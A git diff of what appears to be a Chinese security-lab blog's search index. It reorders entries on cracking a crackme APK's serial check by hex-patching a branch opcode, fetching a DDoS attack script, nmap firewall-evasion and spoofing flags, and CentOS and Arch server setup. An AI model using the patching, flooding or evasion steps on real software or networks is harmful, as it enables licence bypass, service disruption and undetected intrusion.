@@ -1,6 +1,46 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>APK静态分析</title>
+    <url>/2021/12/28/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h2 id="APK静态分析"><a href="#APK静态分析" class="headerlink" title="APK静态分析"></a>APK静态分析</h2><p>目的：</p>
+<ul>
+<li>了解APK（DEX）静态分析的基本步骤</li>
+<li>掌握使用IDApro辅助进行静态分析的方法</li>
+</ul>
+<p>原理：</p>
+<ul>
+<li>程序静态分析（Program Static Analysis）是指在不运行代码的方式下，通过词法分析、语法分析、控制流、数据流分析等技术对程序代码进行扫描，验证代码是否满足规范性、安全性、可靠性、可维护性等指标的一种代码分析技术。目前静态分析技术向模拟执行的技术发展以能够发现更多传统意义上动态测试才能发现的缺陷，例如符号执行、抽象解释、值依赖分析等等并采用数学约束求解工具进行路径约减或者可达性分析以减少误报增加效率。</li>
+<li>Smali，Baksmali分别是指安卓系统里的Java虚拟机（Dalvik）所使用的一种.dex格式文件的汇编器，反汇编器。</li>
+</ul>
+<p>过程：</p>
+<p>使用解压软件打开crackme0502.apk,解压出classes.dex，打开IDApro并将classes.dex拖入到IDA中<img src="https://121.5.125.62:88/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105021723.png" alt="image-20211229105021723"></p>
+<p>导入结构化文件，点击file-script file，然后选择dex.idc文件，确定<img src="https://121.5.125.62:88/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105052129.png" alt="image-20211229105052129"></p>
+<p>按ALT+Q，可以看到DEX文件的结构，选择某一项点击确定，可以跳到相应字段的起始位置<img src="https://121.5.125.62:88/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105232030.png" alt="image-20211229105232030"></p>
+<p>打开eclipse，启动SimpleEdu45虚拟机，并在SimpleEdu45目录下运行命令adb install crackme0502.apk<img src="https://121.5.125.62:88/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105658041.png" alt="image-20211229105658041"></p>
+<p>打开crackeme0502，点击“获取注解”按钮<img src="https://121.5.125.62:88/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105844377.png" alt="image-20211229105844377"></p>
+<p>打开crackme0502，点击“检测注册码”按钮<img src="https://121.5.125.62:88/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105858622.png" alt="image-20211229105858622"></p>
+<p>切换回IDA pro，切换至Exports选项卡。程序运行的主Activity一般叫MainActivity，所以按住ctrl+f，键入Main，可以发现MainActivity中有两个内部类都有OnClick()方法。<img src="https://121.5.125.62:88/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110001643.png" alt="image-20211229110001643"></p>
+<p>分别双击MainActivity$1.onClick@VL和MainActivity$2.onClick@VL来查看对应的方法实现，通过对比，可以发现后者的方法创建了名为SNChecker的一个对象，故序列号检查功能应该在MainActivity$​2.onClick@VL中。</p>
+<p>MainActivity$1.onClick@VL <img src="https://121.5.125.62:88/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110055781.png" alt="image-20211229110055781"></p>
+<p>MainActivity$2.onClick@VL <img src="https://121.5.125.62:88/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110114049.png" alt="image-20211229110114049"></p>
+<p>按空格键将IDA切换至“流程视图”<img src="https://121.5.125.62:88/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110629336.png" alt="image-20211229110629336"></p>
+<p>很明显可以看出，红色的线是不满足条件所跳转到的语句，绿色的是满足条件时的跳转。所以把if-eqz换成if-nez就有可能破解成功。故将光标定位值if-eqz一行<img src="https://121.5.125.62:88/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110655907.png" alt="image-20211229110655907"></p>
+<p>然后切换至HEX-view 1选项卡<img src="https://121.5.125.62:88/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110748059.png" alt="image-20211229110748059"></p>
+<p>关闭IDA，右键使用UltraEdit工具打开classes.dex，按CTRL+F搜索38020F00（有多个38020F00，注意起始地址是否为002D0B0，如下图所示）。由于if-nez的Opcode为39，故将38改为39，然后保存该文件（点击右上角切为16进制显示模式）<img src="https://121.5.125.62:88/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229111128616.png" alt="image-20211229111128616"></p>
+<p>ctrl+f寻找,将38改为39</p>
+<p>运行DexFixer.exe，将保存好的DEX文件拖进窗口中，进行Header的Checksum修复<img src="https://121.5.125.62:88/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229111244001.png" alt="image-20211229111244001"></p>
+<p>把classes.dex重新添加至apk文件（使用360压缩打开apk文件将class.dex替换即可），并运行命令signapk crackme0502.apk重新签名<img src="https://121.5.125.62:88/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229111424498.png" alt="image-20211229111424498"></p>
+<p>并把生成的signed.apk按着之前的方法重新安装至虚拟机中（需要先将之前安装的程序卸载）adb install signed.apk。注意是signed.apk。再次点击下面的按钮，发现软件提示已注册。</p>
+<p><img src="https://121.5.125.62:88/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229111717277.png" alt="image-20211229111717277"></p>
+]]></content>
+      <tags>
+        <tag>APK</tag>
+        <tag>逆向</tag>
+        <tag>IDA</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>APP加壳</title>
     <url>/2021/12/27/APP%E5%8A%A0%E5%A3%B3/</url>
     <content><![CDATA[<h2 id="APP加壳"><a href="#APP加壳" class="headerlink" title="APP加壳"></a>APP加壳</h2><p>目的：</p>
@@ -86,46 +126,6 @@
       </tags>
   </entry>
   <entry>
-    <title>APK静态分析</title>
-    <url>/2021/12/28/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<h2 id="APK静态分析"><a href="#APK静态分析" class="headerlink" title="APK静态分析"></a>APK静态分析</h2><p>目的：</p>
-<ul>
-<li>了解APK（DEX）静态分析的基本步骤</li>
-<li>掌握使用IDApro辅助进行静态分析的方法</li>
-</ul>
-<p>原理：</p>
-<ul>
-<li>程序静态分析（Program Static Analysis）是指在不运行代码的方式下，通过词法分析、语法分析、控制流、数据流分析等技术对程序代码进行扫描，验证代码是否满足规范性、安全性、可靠性、可维护性等指标的一种代码分析技术。目前静态分析技术向模拟执行的技术发展以能够发现更多传统意义上动态测试才能发现的缺陷，例如符号执行、抽象解释、值依赖分析等等并采用数学约束求解工具进行路径约减或者可达性分析以减少误报增加效率。</li>
-<li>Smali，Baksmali分别是指安卓系统里的Java虚拟机（Dalvik）所使用的一种.dex格式文件的汇编器，反汇编器。</li>
-</ul>
-<p>过程：</p>
-<p>使用解压软件打开crackme0502.apk,解压出classes.dex，打开IDApro并将classes.dex拖入到IDA中<img src="https://121.5.125.62:88/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105021723.png" alt="image-20211229105021723"></p>
-<p>导入结构化文件，点击file-script file，然后选择dex.idc文件，确定<img src="https://121.5.125.62:88/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105052129.png" alt="image-20211229105052129"></p>
-<p>按ALT+Q，可以看到DEX文件的结构，选择某一项点击确定，可以跳到相应字段的起始位置<img src="https://121.5.125.62:88/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105232030.png" alt="image-20211229105232030"></p>
-<p>打开eclipse，启动SimpleEdu45虚拟机，并在SimpleEdu45目录下运行命令adb install crackme0502.apk<img src="https://121.5.125.62:88/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105658041.png" alt="image-20211229105658041"></p>
-<p>打开crackeme0502，点击“获取注解”按钮<img src="https://121.5.125.62:88/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105844377.png" alt="image-20211229105844377"></p>
-<p>打开crackme0502，点击“检测注册码”按钮<img src="https://121.5.125.62:88/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105858622.png" alt="image-20211229105858622"></p>
-<p>切换回IDA pro，切换至Exports选项卡。程序运行的主Activity一般叫MainActivity，所以按住ctrl+f，键入Main，可以发现MainActivity中有两个内部类都有OnClick()方法。<img src="https://121.5.125.62:88/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110001643.png" alt="image-20211229110001643"></p>
-<p>分别双击MainActivity$1.onClick@VL和MainActivity$2.onClick@VL来查看对应的方法实现，通过对比，可以发现后者的方法创建了名为SNChecker的一个对象，故序列号检查功能应该在MainActivity$​2.onClick@VL中。</p>
-<p>MainActivity$1.onClick@VL <img src="https://121.5.125.62:88/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110055781.png" alt="image-20211229110055781"></p>
-<p>MainActivity$2.onClick@VL <img src="https://121.5.125.62:88/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110114049.png" alt="image-20211229110114049"></p>
-<p>按空格键将IDA切换至“流程视图”<img src="https://121.5.125.62:88/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110629336.png" alt="image-20211229110629336"></p>
-<p>很明显可以看出，红色的线是不满足条件所跳转到的语句，绿色的是满足条件时的跳转。所以把if-eqz换成if-nez就有可能破解成功。故将光标定位值if-eqz一行<img src="https://121.5.125.62:88/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110655907.png" alt="image-20211229110655907"></p>
-<p>然后切换至HEX-view 1选项卡<img src="https://121.5.125.62:88/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110748059.png" alt="image-20211229110748059"></p>
-<p>关闭IDA，右键使用UltraEdit工具打开classes.dex，按CTRL+F搜索38020F00（有多个38020F00，注意起始地址是否为002D0B0，如下图所示）。由于if-nez的Opcode为39，故将38改为39，然后保存该文件（点击右上角切为16进制显示模式）<img src="https://121.5.125.62:88/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229111128616.png" alt="image-20211229111128616"></p>
-<p>ctrl+f寻找,将38改为39</p>
-<p>运行DexFixer.exe，将保存好的DEX文件拖进窗口中，进行Header的Checksum修复<img src="https://121.5.125.62:88/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229111244001.png" alt="image-20211229111244001"></p>
-<p>把classes.dex重新添加至apk文件（使用360压缩打开apk文件将class.dex替换即可），并运行命令signapk crackme0502.apk重新签名<img src="https://121.5.125.62:88/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229111424498.png" alt="image-20211229111424498"></p>
-<p>并把生成的signed.apk按着之前的方法重新安装至虚拟机中（需要先将之前安装的程序卸载）adb install signed.apk。注意是signed.apk。再次点击下面的按钮，发现软件提示已注册。</p>
-<p><img src="https://121.5.125.62:88/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229111717277.png" alt="image-20211229111717277"></p>
-]]></content>
-      <tags>
-        <tag>APK</tag>
-        <tag>逆向</tag>
-        <tag>IDA</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>DDos攻击</title>
     <url>/2021/11/24/DDos%E6%94%BB%E5%87%BB/</url>
     <content><![CDATA[<h2 id="DDos攻击"><a href="#DDos攻击" class="headerlink" title="DDos攻击"></a>DDos攻击</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/Ha3MrX/DDOs-Attack   # 下载工具</span><br><span class="line">vim ddos-attack.py</span><br><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/python2</span></span><br><span class="line">chmod +777 ddos-attack.py #直接使用</span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -135,6 +135,28 @@
         <tag>ddos</tag>
         <tag>python</tag>
         <tag>kali</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Nmap简单使用</title>
+    <url>/2021/11/24/Nmap%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<h2 id="Nmap简单使用"><a href="#Nmap简单使用" class="headerlink" title="Nmap简单使用"></a>Nmap简单使用</h2><h3 id="躲避防火墙，分组发送报文"><a href="#躲避防火墙，分组发送报文" class="headerlink" title="躲避防火墙，分组发送报文"></a>躲避防火墙，分组发送报文</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -f -v 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h3 id="设定最大传输单元，必须是8的倍数"><a href="#设定最大传输单元，必须是8的倍数" class="headerlink" title="设定最大传输单元，必须是8的倍数"></a>设定最大传输单元，必须是8的倍数</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --mtu 16 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h3 id="指定多个诱饵"><a href="#指定多个诱饵" class="headerlink" title="指定多个诱饵"></a>指定多个诱饵</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -D 192.168.61.130 ME 127.0.0.1  #(ME 后面接目标地址)</span><br></pre></td></tr></table></figure>
+
+<h3 id="源地址欺骗"><a href="#源地址欺骗" class="headerlink" title="源地址欺骗"></a>源地址欺骗</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">namp -sI www.baidu.com:80 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h3 id="源端口欺骗"><a href="#源端口欺骗" class="headerlink" title="源端口欺骗"></a>源端口欺骗</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --source-port 88 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h3 id="根据发包长度（tcp是40字节，icmp溢出是28字节）"><a href="#根据发包长度（tcp是40字节，icmp溢出是28字节）" class="headerlink" title="根据发包长度（tcp是40字节，icmp溢出是28字节）"></a>根据发包长度（tcp是40字节，icmp溢出是28字节）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --data-length 30 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h3 id="MAC地址欺骗"><a href="#MAC地址欺骗" class="headerlink" title="MAC地址欺骗"></a>MAC地址欺骗</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sT -PN --spoof-mac 0 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>nmap</tag>
       </tags>
   </entry>
   <entry>
@@ -174,28 +196,6 @@
 ]]></content>
       <tags>
         <tag>-fckeditor -webshell</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Nmap简单使用</title>
-    <url>/2021/11/24/Nmap%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<h2 id="Nmap简单使用"><a href="#Nmap简单使用" class="headerlink" title="Nmap简单使用"></a>Nmap简单使用</h2><h3 id="躲避防火墙，分组发送报文"><a href="#躲避防火墙，分组发送报文" class="headerlink" title="躲避防火墙，分组发送报文"></a>躲避防火墙，分组发送报文</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -f -v 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<h3 id="设定最大传输单元，必须是8的倍数"><a href="#设定最大传输单元，必须是8的倍数" class="headerlink" title="设定最大传输单元，必须是8的倍数"></a>设定最大传输单元，必须是8的倍数</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --mtu 16 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<h3 id="指定多个诱饵"><a href="#指定多个诱饵" class="headerlink" title="指定多个诱饵"></a>指定多个诱饵</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -D 192.168.61.130 ME 127.0.0.1  #(ME 后面接目标地址)</span><br></pre></td></tr></table></figure>
-
-<h3 id="源地址欺骗"><a href="#源地址欺骗" class="headerlink" title="源地址欺骗"></a>源地址欺骗</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">namp -sI www.baidu.com:80 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<h3 id="源端口欺骗"><a href="#源端口欺骗" class="headerlink" title="源端口欺骗"></a>源端口欺骗</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --source-port 88 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<h3 id="根据发包长度（tcp是40字节，icmp溢出是28字节）"><a href="#根据发包长度（tcp是40字节，icmp溢出是28字节）" class="headerlink" title="根据发包长度（tcp是40字节，icmp溢出是28字节）"></a>根据发包长度（tcp是40字节，icmp溢出是28字节）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --data-length 30 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<h3 id="MAC地址欺骗"><a href="#MAC地址欺骗" class="headerlink" title="MAC地址欺骗"></a>MAC地址欺骗</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sT -PN --spoof-mac 0 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>nmap</tag>
       </tags>
   </entry>
   <entry>
@@ -268,29 +268,6 @@
 ]]></content>
       <tags>
         <tag>typora</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>arch开机启动脚本</title>
-    <url>/2022/02/10/arch%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E8%84%9A%E6%9C%AC/</url>
-    <content><![CDATA[<h2 id="Arch-Linux-添加开机启动脚本"><a href="#Arch-Linux-添加开机启动脚本" class="headerlink" title="Arch Linux 添加开机启动脚本"></a>Arch Linux 添加开机启动脚本</h2><h3 id="0x01-创建一个启动service脚本"><a href="#0x01-创建一个启动service脚本" class="headerlink" title="0x01 创建一个启动service脚本"></a>0x01 创建一个启动service脚本</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nano /usr/lib/systemd/system/rc-local.service</span><br></pre></td></tr></table></figure>
-
-<p>以下是rc-local.service的内容</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=&quot;/etc/rc.local Compatibility&quot;</span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">ExecStart=/etc/rc.local start</span><br><span class="line">TimeoutSec=0</span><br><span class="line">StandardInput=tty</span><br><span class="line">RemainAfterExit=yes</span><br><span class="line">SysVStartPriority=99</span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x02-创建-etc-rc-local-文件"><a href="#0x02-创建-etc-rc-local-文件" class="headerlink" title="0x02 创建 /etc/rc.local 文件"></a>0x02 创建 /etc/rc.local 文件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nano /etc/rc.local</span><br></pre></td></tr></table></figure>
-
-<p>以下是/etc/rc.local的内容</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> /etc/rc.local</span></span><br><span class="line">if test -d /etc/rc.local.d; then</span><br><span class="line">for rcscript in /etc/rc.local.d/*.sh; do</span><br><span class="line">test -r &quot;$&#123;rcscript&#125;&quot; &amp;&amp; sh $&#123;rcscript&#125;</span><br><span class="line">done</span><br><span class="line">unset rcscript</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x03-添加文件执行权限，添加-etc-rc-local-d文件夹，设置开机自启"><a href="#0x03-添加文件执行权限，添加-etc-rc-local-d文件夹，设置开机自启" class="headerlink" title="0x03 添加文件执行权限，添加/etc/rc.local.d文件夹，设置开机自启"></a>0x03 添加文件执行权限，添加/etc/rc.local.d文件夹，设置开机自启</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chmod a+x /etc/rc.local</span><br><span class="line">sudo mkdir /etc/rc.local.d</span><br><span class="line">sudo systemctl enable rc-local</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x04-创建sh脚本放在-etc-rc-local-d-文件夹中"><a href="#0x04-创建sh脚本放在-etc-rc-local-d-文件夹中" class="headerlink" title="0x04 创建sh脚本放在/etc/rc.local.d/文件夹中"></a>0x04 创建sh脚本放在/etc/rc.local.d/文件夹中</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nano /etc/rc.local.d/paru.sh</span><br><span class="line">(编写内容xxxx)</span><br><span class="line">sudo chmod a+x /etc/rc.local.d/paru.sh</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>arch</tag>
-        <tag>开机启动</tag>
       </tags>
   </entry>
   <entry>
@@ -451,26 +428,6 @@
       </tags>
   </entry>
   <entry>
-    <title>centos7安装mariadb</title>
-    <url>/2021/11/24/centos7%E5%AE%89%E8%A3%85mariadb/</url>
-    <content><![CDATA[<h2 id="centos7安装mariadb"><a href="#centos7安装mariadb" class="headerlink" title="centos7安装mariadb"></a>centos7安装mariadb</h2><p>mariadb是MYSQL的一个分支，语法基本和mysql一样，而且兼容mysql，centos7中自带了mariadb的软件包。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> cat /etc/redhat-release</span></span><br><span class="line">CentOS Linux release 7.9.2009 (Core)</span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> uname -a</span></span><br><span class="line">Linux cn7 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>
-
-<h3 id="安装mariadb："><a href="#安装mariadb：" class="headerlink" title="安装mariadb："></a>安装mariadb：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> yum -y install mariadb-server</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="开启mariadb并设置开机启动："><a href="#开启mariadb并设置开机启动：" class="headerlink" title="开启mariadb并设置开机启动："></a>开启mariadb并设置开机启动：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl start mariadb</span></span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl <span class="built_in">enable</span> mariadb</span></span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/mariadb.service to /usr/lib/systemd/system/mariadb.service.</span><br></pre></td></tr></table></figure>
-
-<h3 id="配置数据库"><a href="#配置数据库" class="headerlink" title="配置数据库"></a>配置数据库</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> mysql_secure_installation</span></span><br><span class="line">Enter current password for root (enter for none):  # 输入数据库超级管理员root的密码(注意不是系统root的密码)，第一次进入还没有设置密码则直接回车</span><br><span class="line"></span><br><span class="line">Set root password? [Y/n]  # 设置密码，y</span><br><span class="line"></span><br><span class="line">New password:  # 新密码</span><br><span class="line">Re-enter new password:  # 再次输入密码</span><br><span class="line"></span><br><span class="line">Remove anonymous users? [Y/n]  # 移除匿名用户， y</span><br><span class="line"></span><br><span class="line">Disallow root login remotely? [Y/n]  # 拒绝root远程登录，n，不管y/n，都会拒绝root远程登录</span><br><span class="line"></span><br><span class="line">Remove test database and access to it? [Y/n]  # 删除test数据库，y：删除。n：不删除，数据库中会有一个test数据库，一般不需要</span><br><span class="line"></span><br><span class="line">Reload privilege tables now? [Y/n]  # 重新加载权限表，y</span><br></pre></td></tr></table></figure>
-
-<h3 id="启动数据库"><a href="#启动数据库" class="headerlink" title="启动数据库"></a>启动数据库</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> mysql -u root -p</span></span><br><span class="line">Enter password:</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 2</span><br><span class="line">Server version: 5.5.68-MariaDB MariaDB Server</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">+--------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; quit;</span><br><span class="line">Bye</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>centos7</tag>
-        <tag>mariadb</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>centos7安装apache</title>
     <url>/2021/11/24/centos7%E5%AE%89%E8%A3%85apache/</url>
     <content><![CDATA[<h2 id="centos7-安装Apache"><a href="#centos7-安装Apache" class="headerlink" title="centos7 安装Apache"></a>centos7 安装Apache</h2><h3 id="实验准备：vmware上安装的centos7"><a href="#实验准备：vmware上安装的centos7" class="headerlink" title="实验准备：vmware上安装的centos7"></a>实验准备：vmware上安装的centos7</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> uname -a</span></span><br><span class="line">Linux cn7 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> cat /etc/redhat-release</span></span><br><span class="line">CentOS Linux release 7.9.2009 (Core)</span><br></pre></td></tr></table></figure>
@@ -491,8 +448,28 @@
 <h3 id="访问虚拟机的ip地址"><a href="#访问虚拟机的ip地址" class="headerlink" title="访问虚拟机的ip地址"></a>访问虚拟机的ip地址</h3><p>如果能访问即成功。</p>
 ]]></content>
       <tags>
-        <tag>centos7</tag>
         <tag>apache</tag>
+        <tag>centos7</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>centos7安装mariadb</title>
+    <url>/2021/11/24/centos7%E5%AE%89%E8%A3%85mariadb/</url>
+    <content><![CDATA[<h2 id="centos7安装mariadb"><a href="#centos7安装mariadb" class="headerlink" title="centos7安装mariadb"></a>centos7安装mariadb</h2><p>mariadb是MYSQL的一个分支，语法基本和mysql一样，而且兼容mysql，centos7中自带了mariadb的软件包。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> cat /etc/redhat-release</span></span><br><span class="line">CentOS Linux release 7.9.2009 (Core)</span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> uname -a</span></span><br><span class="line">Linux cn7 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>
+
+<h3 id="安装mariadb："><a href="#安装mariadb：" class="headerlink" title="安装mariadb："></a>安装mariadb：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> yum -y install mariadb-server</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="开启mariadb并设置开机启动："><a href="#开启mariadb并设置开机启动：" class="headerlink" title="开启mariadb并设置开机启动："></a>开启mariadb并设置开机启动：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl start mariadb</span></span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl <span class="built_in">enable</span> mariadb</span></span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/mariadb.service to /usr/lib/systemd/system/mariadb.service.</span><br></pre></td></tr></table></figure>
+
+<h3 id="配置数据库"><a href="#配置数据库" class="headerlink" title="配置数据库"></a>配置数据库</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> mysql_secure_installation</span></span><br><span class="line">Enter current password for root (enter for none):  # 输入数据库超级管理员root的密码(注意不是系统root的密码)，第一次进入还没有设置密码则直接回车</span><br><span class="line"></span><br><span class="line">Set root password? [Y/n]  # 设置密码，y</span><br><span class="line"></span><br><span class="line">New password:  # 新密码</span><br><span class="line">Re-enter new password:  # 再次输入密码</span><br><span class="line"></span><br><span class="line">Remove anonymous users? [Y/n]  # 移除匿名用户， y</span><br><span class="line"></span><br><span class="line">Disallow root login remotely? [Y/n]  # 拒绝root远程登录，n，不管y/n，都会拒绝root远程登录</span><br><span class="line"></span><br><span class="line">Remove test database and access to it? [Y/n]  # 删除test数据库，y：删除。n：不删除，数据库中会有一个test数据库，一般不需要</span><br><span class="line"></span><br><span class="line">Reload privilege tables now? [Y/n]  # 重新加载权限表，y</span><br></pre></td></tr></table></figure>
+
